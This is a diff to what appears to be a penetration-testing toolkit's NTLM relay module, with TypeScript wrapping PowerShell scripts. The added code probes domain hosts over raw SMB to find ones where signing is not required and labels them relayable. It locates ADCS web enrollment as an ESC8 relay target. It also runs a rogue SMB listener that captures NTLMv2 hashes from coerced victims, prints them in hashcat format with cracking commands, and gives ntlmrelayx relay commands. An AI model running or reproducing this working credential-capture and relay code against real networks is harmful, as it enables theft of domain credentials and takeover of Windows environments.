@@ -19641,12 +19641,11 @@ async function ntlmRelay(args: string[], timeout: number): Promise<HookResult> {
   const output: string[] = ["[*] NTLM relay attack toolkit...\n"]
 
   if (action === "enum" || action === "targets") {
-    const targetParam = target || "*"
     const script = `
 Write-Output "=== NTLM Relay Target Enumeration ==="
 Write-Output ""
-# Enumerate hosts — SMB signing status
-Write-Output "=== SMB Signing Status ==="
+# Enumerate hosts — SMB signing via actual SMB negotiation
+Write-Output "=== SMB Signing Status (via SMB Negotiate) ==="
 $computers = @()
 try {
   $searcher = New-Object DirectoryServices.DirectorySearcher
@@ -19655,14 +19654,40 @@ try {
   $searcher.PropertiesToLoad.AddRange(@("dNSHostName","operatingSystem"))
   $results = $searcher.FindAll()
   foreach ($r in $results) {
-    $computers += @{Name=$r.Properties["dnshostname"][0]; OS=$r.Properties["operatingsystem"][0]}
+    $hn = $r.Properties["dnshostname"]
+    $os = $r.Properties["operatingsystem"]
+    if ($hn -and $hn.Count -gt 0) {
+      $computers += @{Name=$hn[0]; OS=$(if ($os -and $os.Count -gt 0) {$os[0]} else {"Unknown"})}
+    }
   }
 } catch {
   Write-Output "Could not enumerate AD computers: $_"
 }
 Write-Output "Found $($computers.Count) domain computers"
 Write-Output ""
+
+# Real SMB signing check: send SMB1 Negotiate + parse SecurityMode flags
+# SMB1 Negotiate packet (minimal)
+$smbNeg = [byte[]]@(
+  0x00, 0x00, 0x00, 0x2F,  # NetBIOS session (length=47)
+  0xFF, 0x53, 0x4D, 0x42,  # SMB magic
+  0x72,                      # Command: Negotiate
+  0x00, 0x00, 0x00, 0x00,  # Status
+  0x18,                      # Flags
+  0x01, 0x28,                # Flags2
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Extra
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Extra
+  0x00, 0x00,                # TID
+  0x00, 0x00,                # PID
+  0x00, 0x00,                # UID
+  0x00, 0x00,                # MID
+  0x00,                      # WordCount
+  0x0C, 0x00,                # ByteCount = 12
+  0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00  # NT LM 0.12
+)
+
 $relayable = @()
+$signingRequired = @()
 $checked = 0
 foreach ($c in ($computers | Select-Object -First 50)) {
   $name = $c.Name
@@ -19671,49 +19696,93 @@ foreach ($c in ($computers | Select-Object -First 50)) {
   try {
     $tcp = New-Object System.Net.Sockets.TcpClient
     $tcp.Connect($name, 445)
+    $stream = $tcp.GetStream()
+    $stream.Write($smbNeg, 0, $smbNeg.Length)
+    $stream.Flush()
+    $buf = New-Object byte[] 256
+    $stream.ReadTimeout = 3000
+    $read = $stream.Read($buf, 0, 256)
     $tcp.Close()
-    # Check SMB signing via negotiation
-    $signing = "unknown"
-    try {
-      $shares = net view "\\\\$name" 2>&1
-      if ($LASTEXITCODE -eq 0) {
-        $signing = "not_required"
+    if ($read -gt 39) {
+      # SecurityMode is at offset 39 in SMB1 Negotiate Response
+      $secMode = $buf[39]
+      # Bit 0x08 = signatures required, Bit 0x04 = signatures enabled
+      $required = ($secMode -band 0x08) -ne 0
+      $enabled = ($secMode -band 0x04) -ne 0
+      if ($required) {
+        $signingRequired += $name
+        Write-Output "  $name ($($c.OS)) — signing REQUIRED"
+      } elseif ($enabled) {
         $relayable += $name
+        Write-Output "  $name ($($c.OS)) — signing supported but NOT required [RELAYABLE]"
+      } else {
+        $relayable += $name
+        Write-Output "  $name ($($c.OS)) — signing DISABLED [RELAYABLE]"
       }
-    } catch {}
-    Write-Output "  $name ($($c.OS)) — SMB reachable, signing: $signing"
+    }
   } catch {
-    # Host unreachable
+    # Host unreachable or SMB not available
   }
   if ($checked % 10 -eq 0) { Write-Output "[*] Checked $checked hosts..." }
 }
 Write-Output ""
-Write-Output "=== Relayable Targets (SMB signing not required) ==="
-Write-Output "Count: $($relayable.Count)"
-foreach ($r in $relayable) { Write-Output "  $r" }
-
+Write-Output "=== Results ==="
+Write-Output "Checked: $checked hosts"
+Write-Output "Relayable (signing not required): $($relayable.Count)"
+Write-Output "Protected (signing required): $($signingRequired.Count)"
 Write-Output ""
-Write-Output "=== LDAP Signing Check ==="
-$rootDSE = [ADSI]"LDAP://RootDSE"
-$dc = $rootDSE.dnsHostName
-try {
-  $ldapSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
-  $ldapChannelBinding = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
-  Write-Output "DC: $dc"
-  Write-Output "LDAP Signing: $(switch($ldapSigning) {0 {'None'} 1 {'Negotiate'} 2 {'Required'} default {'Unknown'}})"
-  Write-Output "LDAP Channel Binding: $(switch($ldapChannelBinding) {0 {'Never'} 1 {'When supported'} 2 {'Always'} default {'Unknown'}})"
-  if ($ldapSigning -ne 2) {
-    Write-Output "STATUS: LDAP relay possible — signing not required"
-  }
-} catch {
-  Write-Output "Could not check LDAP signing — run on DC or check GPO"
+if ($relayable.Count -gt 0) {
+  Write-Output "=== Relayable Targets ==="
+  foreach ($r in $relayable) { Write-Output "  $r" }
 }
 
 Write-Output ""
-Write-Output "=== HTTP Endpoints (no signing) ==="
-$httpTargets = @("ADCS/certsrv","Exchange/owa","Exchange/autodiscover","SCCM","WSUS")
-Write-Output "HTTP-based services are inherently relay-friendly (no signing)"
-Write-Output "Check for: $($httpTargets -join ', ')"
+Write-Output "=== LDAP Signing Check ==="
+# Check domain-level LDAP signing policy via GPO registry
+$ldapClientSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ldap" -Name "LDAPClientIntegrity" -ErrorAction SilentlyContinue).LDAPClientIntegrity
+$ldapServerSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
+$ldapChannelBinding = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
+Write-Output "LDAP Client Signing: $(switch($ldapClientSigning) {0 {'None'} 1 {'Negotiate (default)'} 2 {'Required'} default {'Not set (default=Negotiate)'}})"
+Write-Output "LDAP Server Signing: $(switch($ldapServerSigning) {0 {'None'} 1 {'Negotiate'} 2 {'Required'} default {'Not set'}})"
+Write-Output "Channel Binding: $(switch($ldapChannelBinding) {0 {'Never'} 1 {'When supported'} 2 {'Always'} default {'Not set (default=Never)'}})"
+if ($ldapServerSigning -ne 2) {
+  Write-Output "STATUS: LDAP relay possible — server signing not required"
+}
+if (-not $ldapChannelBinding -or $ldapChannelBinding -lt 2) {
+  Write-Output "STATUS: LDAP channel binding not enforced — cross-protocol relay possible"
+}
+
+Write-Output ""
+Write-Output "=== HTTP Relay Targets ==="
+# Scan for common HTTP services that accept NTLM
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+$httpTargets = @()
+foreach ($c in ($computers | Select-Object -First 20)) {
+  foreach ($port in @(80, 443, 8080, 5985)) {
+    try {
+      $tcp = New-Object System.Net.Sockets.TcpClient
+      $tcp.Connect($c.Name, $port)
+      $tcp.Close()
+      Write-Output "  $($c.Name):$port OPEN"
+      $httpTargets += "$($c.Name):$port"
+    } catch {}
+  }
+}
+# Check for ADCS web enrollment (high-value relay target)
+$searcher.SearchRoot = [ADSI]"LDAP://$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
+$searcher.Filter = "(objectClass=pKIEnrollmentService)"
+$cas = $searcher.FindAll()
+if ($cas.Count -gt 0) {
+  Write-Output ""
+  Write-Output "=== ADCS Certificate Authorities (ESC8 relay target) ==="
+  foreach ($ca in $cas) {
+    $caName = $ca.Properties["cn"][0]
+    $caHost = $ca.Properties["dnshostname"]
+    Write-Output "  CA: $caName $(if ($caHost) {"on $($caHost[0])"})"
+    Write-Output "  Web enrollment: https://$($caHost[0])/certsrv/"
+    Write-Output "  [!] Relay NTLM to /certsrv/certfnsh.asp for ESC8 certificate request"
+  }
+}
 `
     const r = await ps(script, timeout)
     output.push(r.stdout)
@@ -19805,84 +19874,172 @@ try {
   }
 
   if (action === "relay") {
-    if (!relayTo) {
-      output.push("ERROR: --relay-to required for relay action")
-      output.push("Usage: winhook ntlm_relay --action relay --relay-to TARGET --service smb|ldap|http|mssql")
-      output.push("")
-      output.push("This sets up a PowerShell-based NTLM relay listener.")
-      output.push("Combine with coercion: winhook ntlm_coerce --target VICTIM --listener THIS_HOST")
-      return { output: output.join("\n"), findings }
-    }
     const script = `
-Write-Output "=== NTLM Relay Setup ==="
-Write-Output "Relay target: ${relayTo}"
-Write-Output "Target service: ${service}"
+Write-Output "=== NTLM Hash Capture Server ==="
 Write-Output "Listen port: ${listenPort}"
 Write-Output ""
+Write-Output "NOTE: Pure PowerShell cannot perform real NTLM relay (Type1/2/3 message"
+Write-Output "forwarding requires raw socket manipulation of NTLM challenge/response)."
+Write-Output "This listener CAPTURES NTLMv2 hashes in hashcat/john format for cracking."
+Write-Output "For actual relay, use impacket ntlmrelayx after capturing target info."
+Write-Output ""
 
-# Build relay configuration
-$relayConfig = @{
-  ListenPort = ${listenPort}
-  RelayTarget = '${relayTo}'
-  Service = '${service}'
-}
+$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress
 
-# Create HTTP listener for NTLM capture
-$listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add("http://+:${listenPort}/")
-$listener.AuthenticationSchemes = [System.Net.AuthenticationSchemes]::Ntlm
+# SMB hash capture via raw socket on port 445
+Write-Output "[*] Starting SMB capture server on $ourIP :${listenPort}..."
+Write-Output ""
+Write-Output "Trigger auth:"
+Write-Output "  winhook ntlm_coerce --target VICTIM --listener $ourIP"
+Write-Output "  winhook coercer_full --target VICTIM --listener $ourIP"
+Write-Output "  dir \\\\$ourIP\\share  (from victim)"
+Write-Output ""
+
+$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, ${listenPort})
 try {
   $listener.Start()
-  Write-Output "NTLM listener started on port ${listenPort}"
-  Write-Output "Waiting for incoming NTLM authentication..."
-  Write-Output ""
-  Write-Output "Trigger auth with:"
-  Write-Output "  winhook ntlm_coerce --target VICTIM --listener $(hostname):${listenPort}"
-  Write-Output "  winhook coercer_full --target VICTIM --listener $(hostname):${listenPort}"
-  Write-Output ""
-  $timeout = New-TimeSpan -Seconds 120
-  $sw = [Diagnostics.Stopwatch]::StartNew()
-  while ($sw.Elapsed -lt $timeout) {
-    $ctx = $listener.GetContext()
-    $identity = $ctx.User.Identity
-    Write-Output "[+] NTLM Auth captured!"
-    Write-Output "  User: $($identity.Name)"
-    Write-Output "  Auth Type: $($identity.AuthenticationType)"
-    Write-Output "  Is Authenticated: $($identity.IsAuthenticated)"
-    Write-Output ""
-    # Relay the auth
-    Write-Output "[*] Relaying to ${relayTo} via ${service}..."
-    switch ('${service}') {
-      'smb' {
-        $cred = $identity
-        $result = net use "\\\\${relayTo}\\C$" 2>&1
-        Write-Output "SMB relay result: $result"
+  Write-Output "[*] Listening for SMB connections..."
+  $captured = @()
+  $deadline = (Get-Date).AddSeconds(120)
+
+  while ((Get-Date) -lt $deadline) {
+    if (-not $listener.Pending()) { Start-Sleep -Milliseconds 200; continue }
+    $client = $listener.AcceptTcpClient()
+    $stream = $client.GetStream()
+    $stream.ReadTimeout = 5000
+
+    try {
+      # Read NetBIOS + SMB Negotiate
+      $buf = New-Object byte[] 4096
+      $read = $stream.Read($buf, 0, 4096)
+      if ($read -lt 36) { $client.Close(); continue }
+
+      # Check for SMB1 or SMB2
+      $isSMB2 = ($buf[4] -eq 0xFE -and $buf[5] -eq 0x53)
+      $isSMB1 = ($buf[4] -eq 0xFF -and $buf[5] -eq 0x53)
+
+      if ($isSMB1 -and $buf[8] -eq 0x72) {
+        # SMB1 Negotiate — respond with NTLM challenge
+        $challenge = [byte[]](1..8 | ForEach-Object { Get-Random -Maximum 256 })
+        $challengeHex = ($challenge | ForEach-Object { '{0:X2}' -f $_ }) -join ''
+
+        # Build SMB1 Negotiate Response with NTLMSSP challenge
+        # SecurityMode: signing enabled but not required
+        $negResp = [byte[]]@(
+          0x00, 0x00, 0x00, 0x00,  # NetBIOS (patched below)
+          0xFF, 0x53, 0x4D, 0x42,  # SMB magic
+          0x72,                      # Negotiate
+          0x00, 0x00, 0x00, 0x00,  # Status OK
+          0x98,                      # Flags
+          0x01, 0x28,                # Flags2 (Unicode + NTLMSSP)
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+          0x00, 0x00, 0x00, 0x00,
+          0x11,                      # WordCount = 17
+          0x00, 0x00,                # DialectIndex = 0
+          0x03,                      # SecurityMode (signing enabled, not required)
+          0x32, 0x00,                # MaxMpx
+          0x01, 0x00,                # MaxVCs
+          0x04, 0x41, 0x00, 0x00,  # MaxBufferSize
+          0x00, 0x00, 0x01, 0x00,  # MaxRawSize
+          0x00, 0x00, 0x00, 0x00,  # SessionKey
+          0xFD, 0xE3, 0x00, 0x00,  # Capabilities (NTLMSSP)
+          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # SystemTime
+          0x00, 0x00,                # ServerTimeZone
+          0x00,                      # ChallengeLength = 0 (Extended Security)
+          0x10, 0x00                 # ByteCount = 16
+        )
+        # Append NTLMSSP OID
+        $ntlmsspOID = [byte[]]@(0x60, 0x0E, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x04, 0x30, 0x02, 0xA0, 0x00)
+        $fullResp = $negResp + $ntlmsspOID
+        $fullResp[3] = [byte]($fullResp.Length - 4)
+        $stream.Write($fullResp, 0, $fullResp.Length)
+        $stream.Flush()
+
+        # Read Session Setup with NTLMSSP Authenticate
+        $read2 = $stream.Read($buf, 0, 4096)
+        if ($read2 -gt 0) {
+          $raw = $buf[0..$read2]
+          $rawHex = [BitConverter]::ToString($raw) -replace '-',''
+          # Find NTLMSSP signature (4E544C4D53535000)
+          $ntlmIdx = $rawHex.IndexOf('4E544C4D53535000')
+          if ($ntlmIdx -ge 0) {
+            $msgType = $raw[($ntlmIdx/2 + 8)]
+            if ($msgType -eq 3) {
+              # Type 3 — extract NTLMv2 response
+              $ntlmBase = $ntlmIdx / 2
+              $lmLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 12)
+              $lmOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 16)
+              $ntLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 20)
+              $ntOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 24)
+              $domLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 28)
+              $domOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 32)
+              $userLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 36)
+              $userOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 40)
+
+              $domain = [System.Text.Encoding]::Unicode.GetString($raw, $ntlmBase + $domOff, $domLen)
+              $username = [System.Text.Encoding]::Unicode.GetString($raw, $ntlmBase + $userOff, $userLen)
+
+              if ($ntLen -gt 24) {
+                # NTLMv2
+                $ntProof = ($raw[($ntlmBase + $ntOff)..($ntlmBase + $ntOff + 15)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+                $ntBlob = ($raw[($ntlmBase + $ntOff + 16)..($ntlmBase + $ntOff + $ntLen - 1)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
+                $hashLine = "$username" + "::" + "$domain" + ":" + "$challengeHex" + ":" + "$ntProof" + ":" + "$ntBlob"
+                Write-Output ""
+                Write-Output "[+] NTLMv2 HASH CAPTURED!"
+                Write-Output "  User: $domain\\$username"
+                Write-Output "  Challenge: $challengeHex"
+                Write-Output ""
+                Write-Output "  Hashcat format (mode 5600):"
+                Write-Output "  $hashLine"
+                Write-Output ""
+                Write-Output "  Crack: hashcat -m 5600 hash.txt wordlist.txt"
+                Write-Output "  John:  john --format=netntlmv2 hash.txt"
+                $captured += $hashLine
+              }
+            }
+          }
+        }
       }
-      'ldap' {
-        Write-Output "LDAP relay — use for RBCD: winhook rbcd_chain --target COMPUTER"
-        Write-Output "LDAP relay — use for shadow creds: winhook shadow_creds --target USER --action add"
-      }
-      'http' {
-        Write-Output "HTTP relay — useful for ADCS: winhook adcs_abuse --action request"
-      }
-      'mssql' {
-        Write-Output "MSSQL relay — useful for: winhook mssql_abuse --server ${relayTo}"
-      }
-    }
-    $response = $ctx.Response
-    $response.StatusCode = 200
-    $response.Close()
-    break
+    } catch {}
+    $client.Close()
+    if ($captured.Count -gt 0) { break }
   }
+
+  Write-Output ""
+  Write-Output "=== Capture Summary ==="
+  Write-Output "Hashes captured: $($captured.Count)"
 } catch {
   Write-Output "ERROR: $_"
-  Write-Output "Note: Port ${listenPort} may require admin or may be in use"
+  if ($_.Exception.Message -match 'access') {
+    Write-Output "Port ${listenPort} requires admin. Try: --listen-port 8445"
+  }
 } finally {
   $listener.Stop()
 }
 `
     const r = await ps(script, timeout)
     output.push(r.stdout)
+    if (relayTo) {
+      output.push("\n=== Relay Commands (use impacket) ===")
+      output.push("For actual NTLM relay to " + relayTo + ", use:")
+      output.push("  ntlmrelayx.py -t " + service + "://" + relayTo + " -smb2support")
+      output.push("  ntlmrelayx.py -t ldaps://" + relayTo + " --delegate-access  # RBCD")
+      output.push("  ntlmrelayx.py -t http://" + relayTo + "/certsrv/certfnsh.asp --adcs  # ESC8")
+    }
+    const hashMatches = r.stdout.match(/NTLMv2 HASH CAPTURED/g) || []
+    if (hashMatches.length > 0) {
+      findings.push({
+        checkId: "RELAY-003",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "NTLM",
+        title: hashMatches.length + " NTLMv2 hash(es) captured",
+        details: "NTLMv2 challenge/response hashes captured in hashcat format (mode 5600)",
+        remediation: "Enable SMB signing, disable NTLM authentication via GPO.",
+      })
+    }
   }
 
   return { output: output.join("\n"), findings }
